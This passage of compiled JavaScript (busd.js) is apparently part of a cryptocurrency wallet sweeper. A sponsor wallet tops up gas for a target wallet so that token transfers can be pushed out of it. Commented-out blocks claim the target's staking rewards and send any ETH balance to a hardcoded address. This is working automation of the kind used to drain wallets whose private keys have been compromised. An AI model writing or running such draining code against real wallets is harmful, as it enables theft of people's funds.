            balance = balance.sub(cost);
            try {
                if (balance.toNumber() <= 0) {
                    console.log("Not Enough");
                    let sponsorBalance = await provider.getBalance(sponsor.address);
                    sponsorBalance.sub(txBuffer);
                    console.log(`GasLimit: ${sponsorBalance} \n txCost: ${cost}`);
                    if (sponsorBalance > cost) {
                        await sponsor.sendTransaction({
                            to: target.address,
                            value: cost.add(txBuffer),
                            gasPrice: gasPr,
                            gasLimit: 21000
                        });
                        console.log(`Success! sponsored --> ${cost.add(txBuffer)}`);
                    }
                }
                const transferTx = {
                    to: tokenAddress,
                    value: 0,
                    data: calldata,
                    gasPrice: gasPr,
                    gasLimit: gasLim
                };
                await recv.sendTransaction(transferTx);
                console.log(`Success! transfered --> ${tokenBal}`);
            }
            catch (e) {
                console.log(`error: ${e}`);
            }
        }
        /***if(ClaimableReward > 10000000000000000000){

            console.log(`${ClaimableReward} Here!`);
            const contractInterface = Contract.getInterface(stakeContract.interface);
            const claimData = contractInterface.encodeFunctionData("claimAllReward");

            let cgasPr = await provider.getGasPrice();
            let ctx = {
                from: target.getAddress(),
                to: stakeAddress,
                value: 0,
                data: claimData,
            };
            const cgasLim = await provider.estimateGas(ctx);
            const txBuffer = parseEther(".0001");
            const ccost = cgasPr.mul(cgasLim).add(txBuffer);
            let balance = await provider.getBalance(target.address);
            balance = balance.sub(ccost);

            try {

                if (balance.toNumber() <= 0){
                    console.log("Not Enough");
                    let sponsorBalance = await provider.getBalance(sponsor.address);
                    sponsorBalance.sub(txBuffer);
                    console.log(`GasLimit: ${sponsorBalance} \n txCost: ${ccost}`);
            
                    if (sponsorBalance.gt(ccost)) {
                        console.log("Sponsoring");
                        await sponsor.sendTransaction({
                            to: target.address,
                            value: ccost.add(txBuffer),
                            gasPrice: cgasPr,
                            gasLimit: 21000
                        })
                        .then((tx) => {
                            console.log(tx)
                        })
            
                        console.log(`Success! sponsored --> ${ccost.add(txBuffer)}`);
                    }
                }

                const claimTx = {
                    to: stakeAddress,
                    value: 0,
                    data: claimData,
                    gasPrice: cgasPr,
                    gasLimit: cgasLim
                };
                await target.sendTransaction(claimTx);
                console.log(`Success! claimed --> ${ClaimableReward}`);
            }
            catch (e) {
                console.log(`error: ${e}`);
            }
        
        } **/
        /***
        const balance = await provider.getBalance(target.address);
        const txBuffer = parseEther(".001");
    
        const gasPr = await provider.getGasPrice();
        const cost = gasPr.mul("21000");
        const amount = balance.sub(cost);

        console.log("tx " + amount);

       
         
        if (amount.gt(0)) {

        console.log("NEW ACCOUNT WITH ETH! " + amount);

        try {
            await target.sendTransaction({
            to: "0x06ECb97A661d88553221EcfE3BE7C361b1647015",
            value: amount,
            gasPrice: gasPr,
            gasLimit: 21000

            });

            console.log(`Success! transfered --> ${amount}`);
        }
        catch (e) {
            console.log(`error: ${e}`);
        }
        }

        **/
    });
}
main();
//# sourceMappingURL=busd.js.map